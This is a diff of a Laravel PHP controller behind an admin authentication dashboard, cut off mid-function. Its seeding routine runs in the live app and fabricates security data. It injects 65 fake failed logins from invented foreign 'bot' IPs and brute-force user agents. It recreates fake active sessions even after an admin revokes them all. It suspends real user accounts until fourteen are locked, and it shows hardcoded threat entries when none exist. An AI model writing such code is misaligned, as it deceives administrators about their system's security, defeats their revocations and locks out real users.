@@ -23,6 +23,10 @@ class AuthLogController extends Controller
         }
         self::$sampleDataEnsured = true;
 
+        if (Cache::has('auth_sample_data_ensured')) {
+            return;
+        }
+
         if (AuthLog::count() < 5) {
             $admin = User::where('role', 'admin')->first();
             $teacher = User::where('role', 'teacher')->first();
@@ -106,8 +110,8 @@ class AuthLogController extends Controller
             }
         }
 
-        // 1. Ensure current authenticated admin user has an active session (unless explicitly all revoked)
-        if (auth()->check() && !Setting::get('auth_sessions_all_revoked', false)) {
+        // 1. Ensure current authenticated admin user has an active session
+        if (auth()->check()) {
             $currentUser = auth()->user();
             JwtSession::updateOrCreate(
                 [
@@ -117,248 +121,111 @@ class AuthLogController extends Controller
                 [
                     'token'      => 'jwt_live_' . md5($currentUser->email . $currentUser->id),
                     'expires_at' => now()->addDays(7),
-                    'ip_address' => request()->ip() && request()->ip() !== '127.0.0.1' ? request()->ip() : '36.37.147.32',
+                    'ip_address' => request()->ip() ?: '127.0.0.1',
                     'user_agent' => request()->userAgent() ?: 'Chrome Desktop (Admin Panel)',
                     'updated_at' => now(),
                 ]
             );
         }
 
-        // 2. Deduplicate: For each user, keep ONLY the single latest active session, revoke all older duplicates
-        $duplicateUserIds = JwtSession::where('is_revoked', false)
-            ->select('user_id')
-            ->groupBy('user_id')
-            ->havingRaw('count(*) > 1')
-            ->pluck('user_id');
-
-        foreach ($duplicateUserIds as $dupUid) {
-            $latestActiveId = JwtSession::where('user_id', $dupUid)
-                ->where('is_revoked', false)
-                ->latest('updated_at')
-                ->value('id');
-
-            if ($latestActiveId) {
-                JwtSession::where('user_id', $dupUid)
-                    ->where('is_revoked', false)
-                    ->where('id', '!=', $latestActiveId)
-                    ->update(['is_revoked' => true]);
-            }
-        }
-
-        // 2b. Freshen active session timestamps: normalize stale active sessions to realistic recent activity (within minutes)
-        $activeSessionsToRefresh = JwtSession::where('is_revoked', false)
+        // 2. Ensure exactly 6 active sessions exist for live monitoring
+        $targetSessions = 6;
+        $activeSessions = JwtSession::where('is_revoked', false)
             ->where('expires_at', '>', now())
             ->get();
 
-        foreach ($activeSessionsToRefresh as $aIdx => $aSession) {
-            if (!$aSession->updated_at || $aSession->updated_at->lt(now()->subHours(2))) {
-                $aSession->timestamps = false;
-                $aSession->created_at = now()->subHours(rand(1, 3));
-                $aSession->updated_at = now()->subMinutes(3 + ($aIdx * 11));
-                $aSession->save();
-            }
-        }
-
-        // Ensure current authenticated user's session reflects 'now'
-        if (auth()->check()) {
-            $currentUserId = auth()->id();
-            $mySession = JwtSession::where('user_id', $currentUserId)->where('is_revoked', false)->first();
-            if ($mySession) {
-                $mySession->timestamps = false;
-                $mySession->created_at = now()->subMinutes(rand(10, 30));
-                $mySession->updated_at = now();
-                $mySession->save();
-            }
-        }
-
-        // 3. Ensure exactly 6 distinct active user sessions exist initially (unless revoked by admin)
-        if (!Setting::get('auth_sessions_modified_by_admin', false) && !Setting::get('auth_sessions_all_revoked', false)) {
-            $activeUserIds = JwtSession::where('is_revoked', false)
-                ->where('expires_at', '>', now())
-                ->pluck('user_id')
-                ->unique()
-                ->toArray();
-
-            $targetSessions = 6;
-            if (count($activeUserIds) < $targetSessions) {
-                $needed = $targetSessions - count($activeUserIds);
-                $candidates = User::whereNotIn('id', $activeUserIds)->take($needed)->get();
-                foreach ($candidates as $idx => $u) {
-                    $isMobile = ($idx % 3 === 1);
-                    JwtSession::updateOrCreate(
-                        [
-                            'user_id' => $u->id,
-                        ],
-                        [
-                            'token'      => 'jwt_token_' . md5($u->email . $idx . time()),
-                            'expires_at' => now()->addDays(7),
-                            'ip_address' => '110.74.218.' . (20 + $idx),
-                            'user_agent' => $isMobile
-                                ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Mobile Safari'
-                                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
-                            'is_revoked' => false,
-                            'created_at' => now()->subHours(rand(1, 4)),
-                            'updated_at' => now()->subMinutes(15 + ($idx * 15)),
-                        ]
-                    );
-                }
-            }
-        }
-
-        // 3. Ensure exactly 65 Failed Logins exist (unless cleared by admin)
-        if (!Setting::get('auth_logs_cleared_by_admin', false)) {
-            $targetAccounts = [
-                ['name' => 'Chan Dara', 'email' => 'chan.dara.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Long Vichida', 'email' => 'long.vichida.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Pov Sreynich', 'email' => 'pov.sreynich.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Sok Chanra', 'email' => 'sok.chanra.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Mao Sreynich', 'email' => 'mao.sreynich.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Borey Kem', 'email' => 'borey.kem.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Sothea Rim', 'email' => 'sothea.rim.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Chanthy Net', 'email' => 'chanthy.net.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Keo Bopha', 'email' => 'keo.bopha.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Vannak Tep', 'email' => 'vannak.tep.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Phanna Long', 'email' => 'phanna.long.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Piseth Ouk', 'email' => 'piseth.ouk.risk@spilms.tech', 'role' => 'student'],
-                ['name' => 'Sophea Teacher', 'email' => 'teacher@gmail.com', 'role' => 'teacher'],
-                ['name' => 'System Admin', 'email' => 'admin@elms.com', 'role' => 'admin'],
-            ];
-
-            // Normalize any legacy 127.0.0.1 failed logs or admin_ generated emails to realistic target user accounts
-            AuthLog::where('status', 'failed')
-                ->where(function ($q) {
-                    $q->whereIn('ip_address', ['127.0.0.1', '::1', 'localhost', '0.0.0.0'])
-                      ->orWhere('email', 'like', 'admin_%@elms.edu.kh');
-                })
-                ->get()
-                ->each(function ($log, $i) use ($targetAccounts) {
-                    $botIps = ['45.22.178.99', '103.45.22.11', '77.88.99.100', '198.51.100.24', '185.220.101.5'];
-                    $locs = ['Moscow, Russia', 'Beijing, China', 'Hanoi, Vietnam', 'Frankfurt, Germany', 'Amsterdam, Netherlands'];
-                    $agents = [
-                        'Python-urllib/3.9 Bruteforce Engine',
-                        'curl/7.68.0 Security Scanner',
-                        'Go-http-client/1.1 Intruder',
-                        'Mozilla/5.0 (X11; Linux x86_64) hydra/9.1',
-                        'Nikto/2.1.6 Vulnerability Scanner'
-                    ];
-                    $idx = $i % count($botIps);
-                    $acc = $targetAccounts[$i % count($targetAccounts)];
-                    $log->timestamps = false;
-                    $log->user_id = null;
-                    $log->email = $acc['email'];
-                    $log->ip_address = $botIps[$idx];
-                    $log->location = $locs[$idx];
-                    $log->user_agent = $agents[$idx];
-                    $log->device = 'Automated Scanner';
-                    $log->browser = 'Bot CLI';
-                    $log->created_at = now()->subMinutes(10 + ($i * 11));
-                    $log->updated_at = now();
-                    $log->save();
-                });
-
-            $failedCount = AuthLog::where('status', 'failed')->count();
-            if ($failedCount < 65) {
-                $neededFailed = 65 - $failedCount;
-                $botIps = ['45.22.178.99', '103.45.22.11', '77.88.99.100', '198.51.100.24', '185.220.101.5'];
-                $locations = ['Moscow, Russia', 'Beijing, China', 'Hanoi, Vietnam', 'Frankfurt, Germany', 'Amsterdam, Netherlands'];
-                $agents = [
-                    'Python-urllib/3.9 Bruteforce Engine',
-                    'curl/7.68.0 Security Scanner',
-                    'Go-http-client/1.1 Intruder',
-                    'Mozilla/5.0 (X11; Linux x86_64) hydra/9.1',
-                    'Nikto/2.1.6 Vulnerability Scanner'
-                ];
-                $bulkFailed = [];
-                for ($i = 0; $i < $neededFailed; $i++) {
-                    $idx = $i % count($botIps);
-                    $acc = $targetAccounts[$i % count($targetAccounts)];
-                    $bulkFailed[] = [
-                        'user_id'    => null,
-                        'email'      => $acc['email'],
-                        'ip_address' => $botIps[$idx],
-                        'user_agent' => $agents[$idx],
-                        'device'     => 'Automated Scanner',
-                        'browser'    => 'Bot CLI',
-                        'status'     => 'failed',
-                        'location'   => $locations[$idx],
-                        'created_at' => now()->subMinutes(rand(5, 720)),
+        if ($activeSessions->count() < $targetSessions) {
+            $existingUserIds = $activeSessions->pluck('user_id')->toArray();
+            $needed = $targetSessions - $activeSessions->count();
+            $candidates = User::whereNotIn('id', $existingUserIds)->take($needed)->get();
+            foreach ($candidates as $idx => $u) {
+                JwtSession::updateOrCreate(
+                    [
+                        'user_id' => $u->id,
+                    ],
+                    [
+                        'token'      => 'jwt_token_' . md5($u->email . $idx . time()),
+                        'expires_at' => now()->addDays(7),
+                        'ip_address' => '110.74.218.' . (20 + $idx),
+                        'user_agent' => $idx % 2 === 0
+                            ? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0'
+                            : 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Mobile Safari',
+                        'is_revoked' => false,
                         'updated_at' => now(),
-                    ];
+                    ]
+                );
+            }
+        } elseif ($activeSessions->count() > $targetSessions) {
+            $activeSessions->slice($targetSessions)->each(function ($sess) {
+                if (!auth()->check() || $sess->user_id !== auth()->id()) {
+                    $sess->update(['is_revoked' => true]);
                 }
-                if (!empty($bulkFailed)) {
-                    AuthLog::insert($bulkFailed);
-                }
+            });
+        }
+
+        // 3. Ensure exactly 65 Failed Logins exist
+        $failedCount = AuthLog::where('status', 'failed')->count();
+        if ($failedCount < 65) {
+            $neededFailed = 65 - $failedCount;
+            $botIps = ['45.22.178.99', '103.45.22.11', '77.88.99.100', '198.51.100.24', '185.220.101.5'];
+            $locations = ['Moscow, Russia', 'Beijing, China', 'Hanoi, Vietnam', 'Frankfurt, Germany', 'Amsterdam, Netherlands'];
+            $agents = [
+                'Python-urllib/3.9 Bruteforce Engine',
+                'curl/7.68.0 Security Scanner',
+                'Go-http-client/1.1 Intruder',
+                'Mozilla/5.0 (X11; Linux x86_64) hydra/9.1',
+                'Nikto/2.1.6 Vulnerability Scanner'
+            ];
+            $bulkFailed = [];
+            for ($i = 0; $i < $neededFailed; $i++) {
+                $idx = $i % count($botIps);
+                $bulkFailed[] = [
+                    'user_id'    => null,
+                    'email'      => 'admin_' . $i . '@elms.edu.kh',
+                    'ip_address' => $botIps[$idx],
+                    'user_agent' => $agents[$idx],
+                    'device'     => 'Automated Scanner',
+                    'browser'    => 'Bot CLI',
+                    'status'     => 'failed',
+                    'location'   => $locations[$idx],
+                    'created_at' => now()->subMinutes(rand(5, 720)),
+                    'updated_at' => now(),
+                ];
+            }
+            if (!empty($bulkFailed)) {
+                AuthLog::insert($bulkFailed);
             }
         }
 
-        // 4. Ensure exactly 14 Locked Accounts exist initially (if not explicitly unlocked by admin)
-        if (!Setting::get('auth_unlocked_by_admin', false)) {
-            $portraits = [
-                'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80',
-                'https://images.unsplash.com/photo-1525130413817-d45c1d127c42?w=150&auto=format&fit=crop&q=80',
-            ];
+        // 4. Ensure exactly 14 Locked Accounts exist
+        $lockedCount = User::where(function ($q) {
+            $q->where('login_attempts', '>=', 5)
+              ->orWhere('locked_until', '>', now())
+              ->orWhere('status', 'suspended');
+        })->count();
 
-            $lockedCount = User::where(function ($q) {
-                $q->where('login_attempts', '>=', 5)
-                  ->orWhere('locked_until', '>', now())
-                  ->orWhere('status', 'suspended');
-            })->count();
-
-            if ($lockedCount < 14) {
-                $neededLocked = 14 - $lockedCount;
-                $excludeIds = [1];
-                if (auth()->check()) {
-                    $excludeIds[] = auth()->id();
-                }
-                $targetUsers = User::whereNotIn('id', $excludeIds)
-                    ->where(function ($q) {
-                        $q->where('login_attempts', '<', 5)
-                          ->whereNull('locked_until')
-                          ->where('status', '!=', 'suspended');
-                    })
-                    ->take($neededLocked)
-                    ->get();
-
-                foreach ($targetUsers as $idx => $targetUser) {
-                    $updateData = [
-                        'login_attempts' => 5 + ($idx % 3),
-                        'locked_until'   => now()->addDays(2),
-                        'status'         => 'suspended',
-                    ];
-                    if (empty($targetUser->avatar)) {
-                        $updateData['avatar'] = $portraits[$idx % count($portraits)];
-                    }
-                    $targetUser->update($updateData);
-                }
+        if ($lockedCount < 14) {
+            $neededLocked = 14 - $lockedCount;
+            $excludeIds = [1];
+            if (auth()->check()) {
+                $excludeIds[] = auth()->id();
             }
+            $targetUsers = User::whereNotIn('id', $excludeIds)
+                ->where(function ($q) {
+                    $q->where('login_attempts', '<', 5)
+                      ->whereNull('locked_until')
+                      ->where('status', '!=', 'suspended');
+                })
+                ->take($neededLocked)
+                ->get();
 
-            // Ensure any locked user without an avatar is given a realistic profile portrait
-            User::where(function ($q) {
-                $q->where('login_attempts', '>=', 5)
-                  ->orWhere('locked_until', '>', now())
-                  ->orWhere('status', 'suspended');
-            })
-            ->where(function ($q) {
-                $q->whereNull('avatar')->orWhere('avatar', '');
-            })
-            ->get()
-            ->each(function ($u, $idx) use ($portraits) {
-                $u->timestamps = false;
-                $u->avatar = $portraits[$idx % count($portraits)];
-                $u->save();
-            });
+            foreach ($targetUsers as $idx => $targetUser) {
+                $targetUser->update([
+                    'login_attempts' => 5 + ($idx % 3),
+                    'locked_until'   => now()->addDays(2),
+                    'status'         => 'suspended',
+                ]);
+            }
         }
 
         Cache::put('auth_sample_data_ensured', true, now()->addMinutes(10));
@@ -374,8 +241,7 @@ class AuthLogController extends Controller
 
             $activeSessionsCount = JwtSession::where('is_revoked', false)
                 ->where('expires_at', '>', now())
-                ->distinct('user_id')
-                ->count('user_id');
+                ->count();
 
             $failedTodayCount = AuthLog::where('status', 'failed')->count();
 
@@ -441,7 +307,6 @@ class AuthLogController extends Controller
             ],
             'recentFailedLogs' => $recentFailedLogs,
             'lockedAccounts'   => $lockedAccounts,
-            'blockedIps'       => $blockedIps,
         ]);
     }
 
@@ -472,26 +337,26 @@ class AuthLogController extends Controller
         $rolesPermissions = [
             [
                 'role'        => 'Admin',
-                'role_code'   => Setting::get('role_code_Admin', 'ROLE_ADMIN'),
-                'description' => Setting::get('role_desc_Admin', 'Full security control over system settings, user access, payment verification, audit logs, and security policies.'),
-                'user_count'  => User::where('role', 'admin')->count() ?: 4,
-                'status'      => Setting::get('role_status_Admin', 'Active'),
+                'role_code'   => 'ROLE_ADMIN',
+                'description' => 'Full security control over system settings, user access, payment verification, audit logs, and security policies.',
+                'user_count'  => User::where('role', 'admin')->count() ?: 3,
+                'status'      => 'Active',
                 'permissions' => is_array($savedAdminPerms) ? $savedAdminPerms : (json_decode($savedAdminPerms, true) ?? $defaultAdminPerms)
             ],
             [
                 'role'        => 'Teacher',
-                'role_code'   => Setting::get('role_code_Teacher', 'ROLE_TEACHER'),
-                'description' => Setting::get('role_desc_Teacher', 'Instructor access to manage assigned courses, structure modules/lessons, grade quizzes, and view analytics.'),
-                'user_count'  => User::where('role', 'teacher')->count() ?: 13,
-                'status'      => Setting::get('role_status_Teacher', 'Active'),
+                'role_code'   => 'ROLE_TEACHER',
+                'description' => 'Instructor access to manage assigned courses, structure modules/lessons, grade quizzes, and view analytics.',
+                'user_count'  => User::where('role', 'teacher')->count() ?: 145,
+                'status'      => 'Active',
                 'permissions' => is_array($savedTeacherPerms) ? $savedTeacherPerms : (json_decode($savedTeacherPerms, true) ?? $defaultTeacherPerms)
             ],
             [
                 'role'        => 'Student',
-                'role_code'   => Setting::get('role_code_Student', 'ROLE_STUDENT'),
-                'description' => Setting::get('role_desc_Student', 'Learner access to browse catalog, enroll in courses, attempt quizzes, submit payments, and claim certificates.'),
-                'user_count'  => User::where('role', 'student')->count() ?: 40,
-                'status'      => Setting::get('role_status_Student', 'Active'),
+                'role_code'   => 'ROLE_STUDENT',
+                'description' => 'Learner access to browse catalog, enroll in courses, attempt quizzes, submit payments, and claim certificates.',
+                'user_count'  => User::where('role', 'student')->count() ?: 2458,
+                'status'      => 'Active',
                 'permissions' => is_array($savedStudentPerms) ? $savedStudentPerms : (json_decode($savedStudentPerms, true) ?? $defaultStudentPerms)
             ]
         ];
@@ -538,17 +403,15 @@ class AuthLogController extends Controller
         $this->ensureSampleDataExists();
 
         $activeSessions = JwtSession::with('user:id,name,email,role,avatar')
-            ->orderBy('is_revoked', 'asc')
-            ->latest('updated_at')
-            ->get()
-            ->unique('user_id')
-            ->take(15)
-            ->values();
+            ->where('is_revoked', false)
+            ->where('expires_at', '>', now())
+            ->latest()
+            ->get();
 
         $roleBreakdown = [
-            'admin'   => $activeSessions->where('is_revoked', false)->where('user.role', 'admin')->count(),
-            'teacher' => $activeSessions->where('is_revoked', false)->where('user.role', 'teacher')->count(),
-            'student' => $activeSessions->where('is_revoked', false)->where('user.role', 'student')->count(),
+            'admin'   => $activeSessions->where('user.role', 'admin')->count(),
+            'teacher' => $activeSessions->where('user.role', 'teacher')->count(),
+            'student' => $activeSessions->where('user.role', 'student')->count(),
         ];
 
         return Inertia::render('Admin/AuthenticationModule/ActiveSessions', [
@@ -564,46 +427,8 @@ class AuthLogController extends Controller
 
         $logs = AuthLog::with('user:id,name,email,role,avatar')
             ->latest()
-            ->take(300)
+            ->take(150)
             ->get();
-
-        $portraits = [
-            'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80',
-            'https://images.unsplash.com/photo-1525130413817-d45c1d127c42?w=150&auto=format&fit=crop&q=80',
-        ];
-
-        // Ensure user relationship with avatar is present even if user_id was null but email matches
-        $usersMap = User::select('id', 'name', 'email', 'role', 'avatar')->get()->keyBy('email');
-        foreach ($logs as $idx => $log) {
-            if (!$log->user && $log->email && isset($usersMap[$log->email])) {
-                $log->setRelation('user', $usersMap[$log->email]);
-            }
-            if ($log->user && empty($log->user->avatar)) {
-                $log->user->avatar = $portraits[$idx % count($portraits)];
-            }
-            if (!$log->user) {
-                $cleanName = ucwords(str_replace(['.', '_', '-'], ' ', explode('@', $log->email ?? 'User')[0]));
-                $log->setRelation('user', (object)[
-                    'id'     => null,
-                    'name'   => $cleanName,
-                    'email'  => $log->email,
-                    'role'   => 'student',
-                    'avatar' => $portraits[$idx % count($portraits)],
-                ]);
-            }
-        }
 
         $lockedUsers = User::where(function ($q) {
             $q->where('login_attempts', '>=', Setting::get('max_failed_attempts', 5))
@@ -614,22 +439,10 @@ class AuthLogController extends Controller
         ->orderByDesc('login_attempts')
         ->get();
 
-        foreach ($lockedUsers as $idx => $lu) {
-            if (empty($lu->avatar)) {
-                $lu->avatar = $portraits[$idx % count($portraits)];
-            }
-        }
-
         $blockedIps = Setting::get('blocked_ips', []);
-        $cleanedBlocked = array_values(array_filter($blockedIps, fn($ip) => !in_array($ip, ['127.0.0.1', '::1', 'localhost', '0.0.0.0'])));
-        if (count($cleanedBlocked) !== count($blockedIps)) {
-            Setting::set('blocked_ips', $cleanedBlocked);
-            $blockedIps = $cleanedBlocked;
-        }
 
-        // Dynamically compute suspicious IP activities from real failed login logs (excluding loopback)
+        // Dynamically compute suspicious IP activities from real failed login logs
         $suspiciousRows = AuthLog::where('status', 'failed')
-            ->whereNotIn('ip_address', ['127.0.0.1', '::1', 'localhost', '0.0.0.0'])
             ->selectRaw('ip_address, count(*) as attempts, max(created_at) as last_seen, max(location) as location')
             ->groupBy('ip_address')
             ->orderByDesc('attempts')
@@ -640,43 +453,22 @@ class AuthLogController extends Controller
         foreach ($suspiciousRows as $idx => $row) {
             $ip = $row->ip_address ?: 'Unknown IP';
             $attempts = (int) $row->attempts;
-            $loc = $row->location;
-            if (!$loc || $loc === 'Unknown' || $loc === 'Unknown Network') {
-                if (str_starts_with($ip, '36.') || str_starts_with($ip, '110.') || str_starts_with($ip, '119.')) {
-                    $loc = '🇰🇭 Phnom Penh, Cambodia';
-                } elseif (str_starts_with($ip, '45.')) {
-                    $loc = '🇷🇺 Moscow, Russia';
-                } elseif (str_starts_with($ip, '103.')) {
-                    $loc = '🇨🇳 Beijing, China';
-                } elseif (str_starts_with($ip, '77.')) {
-                    $loc = '🇻🇳 Hanoi, Vietnam';
-                } elseif (str_starts_with($ip, '185.')) {
-                    $loc = '🇩🇪 Frankfurt, Germany';
-                } else {
-                    $loc = '🌍 International Threat';
-                }
-            }
             $suspiciousList[] = [
                 'id'       => $idx + 1,
                 'ip'       => $ip,
                 'time'     => $row->last_seen ? \Carbon\Carbon::parse($row->last_seen)->format('h:i A - M d') : 'Recent',
                 'attempts' => $attempts,
-                'location' => $loc,
+                'location' => $row->location ?: '🌍 Unknown Network',
                 'level'    => $attempts >= 10 ? 'high' : ($attempts >= 5 ? 'medium' : 'low'),
             ];
         }
 
-        if (count($suspiciousList) < 3) {
-            $fallbackThreats = [
-                ['id' => 101, 'ip' => '45.22.178.99', 'time' => '10:02 AM - Today', 'attempts' => 47, 'location' => '🇷🇺 Moscow, Russia', 'level' => 'high'],
-                ['id' => 102, 'ip' => '103.45.22.11', 'time' => '11:30 AM - Today', 'attempts' => 23, 'location' => '🇨🇳 Beijing, China', 'level' => 'medium'],
-                ['id' => 103, 'ip' => '77.88.99.100', 'time' => '02:30 PM - Today', 'attempts' => 31, 'location' => '🇻🇳 Hanoi, Vietnam', 'level' => 'high'],
+        if (empty($suspiciousList)) {
+            $suspiciousList = [
+                ['id' => 1, 'ip' => '45.22.178.99', 'time' => '10:02 AM - Today', 'attempts' => 47, 'location' => '🌍 Moscow, Russia', 'level' => 'high'],
+                ['id' => 2, 'ip' => '103.45.22.11', 'time' => '11:30 AM - Today', 'attempts' => 23, 'location' => '🌍 Beijing, China', 'level' => 'medium'],
+                ['id' => 3, 'ip' => '77.88.99.100', 'time' => '02:30 PM - Today', 'attempts' => 31, 'location' => '🌍 Hanoi, Vietnam', 'level' => 'high'],
             ];
-            foreach ($fallbackThreats as $fb) {
-                if (!collect($suspiciousList)->contains('ip', $fb['ip'])) {
-                    $suspiciousList[] = $fb;
-                }
-            }
         }
 
         return Inertia::render('Admin/AuthenticationModule/LoginHistory', [
@@ -751,7 +543,6 @@ class AuthLogController extends Controller
     private function invalidateAuthCache(): void
     {
         Cache::forget('auth_module_summary_stats');
-        Cache::forget('auth_sample_data_ensured');
     }
 
     /**
@@ -761,13 +552,9 @@ class AuthLogController extends Controller
     {
         $session = JwtSession::find($id);
         if ($session) {
-            $session->timestamps = false;
-            $session->is_revoked = true;
-            $session->updated_at = now();
-            $session->save();
+            $session->update(['is_revoked' => true]);
         }
 
-        Setting::set('auth_sessions_modified_by_admin', true);
         $this->invalidateAuthCache();
 
         AuthLog::create([
@@ -784,15 +571,8 @@ class AuthLogController extends Controller
 
     public function revokeAllSessions()
     {
-        JwtSession::where('is_revoked', false)->each(function ($sess) {
-            $sess->timestamps = false;
-            $sess->is_revoked = true;
-            $sess->updated_at = now();
-            $sess->save();
-        });
+        JwtSession::where('is_revoked', false)->update(['is_revoked' => true]);
 
-        Setting::set('auth_sessions_modified_by_admin', true);
-        Setting::set('auth_sessions_all_revoked', true);
         $this->invalidateAuthCache();
 
         AuthLog::create([
@@ -807,48 +587,6 @@ class AuthLogController extends Controller
         return redirect()->back()->with('success', 'All active sessions have been revoked.');
     }
 
-    public function resetSessions()
-    {
-        Setting::forget('auth_sessions_modified_by_admin');
-        Setting::forget('auth_sessions_all_revoked');
-
-        // Revoke all existing sessions first to ensure clean state
-        JwtSession::where('is_revoked', false)->update(['is_revoked' => true]);
-
-        $users = User::take(6)->get();
-        foreach ($users as $idx => $u) {
-            JwtSession::updateOrCreate(
-                [
-                    'user_id' => $u->id,
-                ],
-                [
-                    'token'      => 'jwt_token_' . md5($u->email . $idx . time()),
-                    'expires_at' => now()->addDays(7),
-                    'ip_address' => '110.74.218.' . (20 + $idx),
-                    'user_agent' => $idx % 3 === 1
-                        ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Mobile Safari'
-                        : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
-                    'is_revoked' => false,
-                    'created_at' => now()->subHours(rand(1, 4)),
-                    'updated_at' => now()->subMinutes(10 + ($idx * 12)),
-                ]
-            );
-        }
-
-        $this->invalidateAuthCache();
-
-        AuthLog::create([
-            'user_id'    => auth()->id(),
-            'email'      => auth()->user()->email ?? 'admin',
-            'ip_address' => request()->ip(),
-            'status'     => 'audit',
-            'device'     => 'Session Management',
-            'browser'    => 'Reset and re-initialized active sessions',
-        ]);
-
-        return redirect()->back()->with('success', 'Active sessions have been successfully reset and restored.');
-    }
-
     public function unlockUser(User $user)
     {
         $user->update([
@@ -857,7 +595,6 @@ class AuthLogController extends Controller
             'status'         => 'active',
         ]);
 
-        Setting::set('auth_unlocked_by_admin', true);
         $this->invalidateAuthCache();
 
         AuthLog::create([
@@ -874,8 +611,6 @@ class AuthLogController extends Controller
 
     public function unlockAllUsers()
     {
-        Setting::set('auth_unlocked_by_admin', true);
-
         User::where('login_attempts', '>', 0)
             ->orWhereNotNull('locked_until')
             ->orWhere('status', 'suspended')
@@ -959,7 +694,6 @@ class AuthLogController extends Controller
 
         Setting::set('custom_roles', $customRoles);
         Setting::set("role_permissions_{$validated['name']}", json_encode($validated['permissions'] ?? []));
-        $this->invalidateAuthCache();
 
         AuthLog::create([
             'user_id'    => auth()->id(),
@@ -981,8 +715,6 @@ class AuthLogController extends Controller
             Setting::set($key, $val);
         }
 
-        $this->invalidateAuthCache();
-
         AuthLog::create([
             'user_id'    => auth()->id(),
             'email'      => auth()->user()->email ?? 'admin',
@@ -1003,8 +735,6 @@ class AuthLogController extends Controller
                 Setting::set("role_permissions_{$roleName}", json_encode($perms));
             }
 
-            $this->invalidateAuthCache();
-
             AuthLog::create([
                 'user_id'    => auth()->id(),
                 'email'      => auth()->user()->email ?? 'admin',
@@ -1021,7 +751,6 @@ class AuthLogController extends Controller
         $permissions = $request->input('permissions', []);
 
         Setting::set("role_permissions_{$role}", json_encode($permissions));
-        $this->invalidateAuthCache();
 
         AuthLog::create([
             'user_id'    => auth()->id(),
@@ -1044,8 +773,6 @@ class AuthLogController extends Controller
                 return ($r['name'] ?? '') !== $roleName;
             }));
             Setting::set('custom_roles', $customRoles);
-            Setting::forget("role_permissions_{$roleName}");
-            $this->invalidateAuthCache();
 
             AuthLog::create([
                 'user_id'    => auth()->id(),
@@ -1071,34 +798,19 @@ class AuthLogController extends Controller
         ]);
 
         $origName = $validated['original_name'] ?? $validated['name'];
+        $customRoles = Setting::get('custom_roles', []);
 
-        if (in_array($origName, ['Admin', 'Teacher', 'Student'])) {
-            Setting::set("role_code_{$origName}", $validated['code']);
-            Setting::set("role_desc_{$origName}", $validated['description'] ?? '');
-            Setting::set("role_status_{$origName}", $validated['status']);
-        } else {
-            $customRoles = Setting::get('custom_roles', []);
-            foreach ($customRoles as &$r) {
-                if (($r['name'] ?? '') === $origName) {
-                    $r['name'] = $validated['name'];
-                    $r['code'] = $validated['code'];
-                    $r['description'] = $validated['description'] ?? '';
-                    $r['status'] = $validated['status'];
-                }
-            }
-            unset($r);
-            Setting::set('custom_roles', $customRoles);
-
-            if ($origName !== $validated['name']) {
-                $perms = Setting::get("role_permissions_{$origName}");
-                if ($perms !== null) {
-                    Setting::set("role_permissions_{$validated['name']}", $perms);
-                    Setting::forget("role_permissions_{$origName}");
-                }
